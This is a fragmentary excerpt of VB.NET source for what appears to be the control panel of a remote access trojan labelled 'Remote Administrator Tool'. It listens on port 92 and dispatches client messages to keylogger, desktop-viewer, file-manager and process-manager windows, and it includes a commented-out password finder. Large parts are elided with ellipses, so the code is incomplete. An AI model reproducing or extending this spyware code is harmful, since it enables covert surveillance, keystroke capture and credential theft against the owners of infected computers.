        ...
        Try
            Select Case A(0)
                Case "info" ' Client Sent me PC name
                    ...
                    NotifyIcon1.BalloonTipTitle = "Remote Administrator Tool"
                    NotifyIcon1.BalloonTipText = "New Server [ ID : " & A(1) & " IP : " & S.IP(sock) & " ]"
                ...
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.White
                            Exit For
                        End If
                    Next
                Case "||||"
                ...
                Case "getlog"
                    Dim F As frmKeylogger = My.Application.OpenForms("openlo" & sock)
                    F.TextBox1.Text = A(1)
                Case "|||"
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                ...
                Case "fun"
                    ...
                    '        Exit Sub
                    '    End If
                    '    Dim fm As New frmPasswordFinder
                    '    fm.sock = sock
                    '    fm.Name = "++" & sock
                ...
                Case "@" ' i recive image  
                    Dim F As frmDesktopViewer = My.Application.OpenForms("!" & sock)
                ...
                Case "FileManager"
                    Dim fff As frmFileManager = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                    ...
                    End If
                Case "ProcessManager"
                    Dim f As frmTaskManager = My.Application.OpenForms("||||" & sock)
                    ...
                    Next
                    'Case "ppww"
                    '    Dim f As frmPasswordFinder = My.Application.OpenForms("++" & sock)
...
#End Region
    ...
    Private Sub L1_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs)
    ...
    Sub startlisten()
        ...
        Catch : End Try
        lbl1.Text = "Listening On Port : 92"
    ...
    Private Sub L1_SelectedIndexChanged1(ByVal sender As Object, ByVal e As System.EventArgs) Handles L1.SelectedIndexChanged
        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
    ...
    Private Sub rec_SpeechRecognized(ByVal sender As Object, ByVal e As System.Speech.Recognition.SpeechRecognizedEventArgs) Handles rec.SpeechRecognized
        If e.Result.Text = "close" Then
            ...
            Me.Close()
        ElseIf e.Result.Text = "start" Then
            If Button3.Text = "Start" Then
                Button3.Text = "Stop"
